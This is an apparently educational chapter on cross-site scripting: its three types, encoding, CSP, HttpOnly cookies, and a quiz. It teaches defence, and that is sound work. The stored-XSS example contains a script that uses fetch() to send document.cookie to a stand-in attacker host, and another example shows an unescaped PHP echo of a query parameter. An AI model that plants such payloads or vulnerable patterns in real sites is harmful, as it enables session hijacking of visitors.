# Chapter 6: Cross-Site Scripting (XSS) & Frontend Defense 💉🛡️

What if an attacker doesn't hack your server directly, but tricks your server into attacking every person who visits your website?

This is **Cross-Site Scripting (XSS)**: one of the most pervasive client-side vulnerabilities in web development.

---

## 💡 The Mental Model: The Poisoned Community Chalkboard

Imagine a community library with a public chalkboard where visitors can write book recommendations:
- A courteous visitor writes: *"The Secret Garden is wonderful!"*
- A malicious trickster writes: *"Whoever reads this must immediately reach into their pocket and hand their library card to the person standing by the door!"*
- When other visitors read the board, their eyes process the instructions, and because they trust the chalkboard, they obey!

In web terms:
- The chalkboard is your website's comment section.
- The malicious note is a snippet of **JavaScript** (`<script>`).
- When unsuspecting users load the page, **their browser executes the attacker's script**, which steals their session cookies or redirects them to a fake login page!

---

## 🦠 The 3 Types of XSS

### 1. Stored XSS (Persistent — Most Dangerous)
The malicious script is saved directly in the server's database (e.g. inside a comment, forum post, or user profile bio):
```html
<!-- Malicious comment saved in database -->
Great article! <script>fetch('https://evil-attacker.com/steal?cookie=' + document.cookie);</script>
```
Every single visitor who views that comment executes the attacker's payload!

### 2. Reflected XSS (Non-Persistent)
The script is embedded inside a URL query parameter and reflected immediately back into the HTML without being saved:
```
https://school-portal.org/search?q=<script>alert('Vulnerable!')</script>
```
If the PHP/HTML server renders:
```html
<h1>Search Results for: <?php echo $_GET['q']; ?></h1>
```
The browser parses the `<script>` tag and executes it!

### 3. DOM-Based XSS
The vulnerability occurs entirely inside client-side JavaScript without the server ever seeing the payload (e.g. using `innerHTML` or `document.write` with `location.hash`).

---

## 🛡️ Defeating XSS: The Defensive Toolkit

### 1. Context-Aware HTML Entity Encoding (Sanitization)
Never render raw user text directly into HTML. Convert dangerous executable characters into harmless HTML entities:

| Dangerous Character | Safe HTML Entity |
| :--- | :--- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

#### In PHP:
```php
// ✅ Secure output escaping
echo htmlspecialchars($userComment, ENT_QUOTES, 'UTF-8');
```

#### In Modern JavaScript:
```javascript
// ❌ Dangerous: Parses text as HTML markup
commentDiv.innerHTML = userComment;

// ✅ Safe: Treats input strictly as harmless plain text
commentDiv.textContent = userComment;
```

### 2. Content Security Policy (CSP)
Tell the browser which script sources are allowed to run using HTTP response headers:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```
Even if an attacker injects an inline `<script>`, the browser refuses to execute it!

### 3. `HttpOnly` Cookies
Flag session cookies with `HttpOnly` so JavaScript (`document.cookie`) cannot read them, preventing session hijacking even if an XSS flaw exists!

---

## 🧠 Checkpoint Quiz

1. **What is the difference between `innerHTML` and `textContent` in JavaScript security?**
   - *Answer: `innerHTML` parses input as HTML markup, executing any injected `<script>` or event handlers; `textContent` treats input strictly as plain text, rendering executable characters harmlessly.*
2. **What does the `htmlspecialchars()` function do in PHP?**
   - *Answer: It converts special characters like `<` and `>` into their corresponding HTML entities (`&lt;` and `&gt;`), preventing XSS.*
3. **How does a Content Security Policy (CSP) protect users from XSS?**
   - *Answer: It restricts which domains and types of scripts are permitted to execute, blocking inline injected code from running.*

---

## 🎯 Hands-On Mission

Visit the **XSS Defense Sandbox** in our Cybersecurity Lab Studio:
1. Type a test script payload `<script>alert('test')</script>`.
2. Compare the raw unsafe output vs the sanitized HTML entity output!
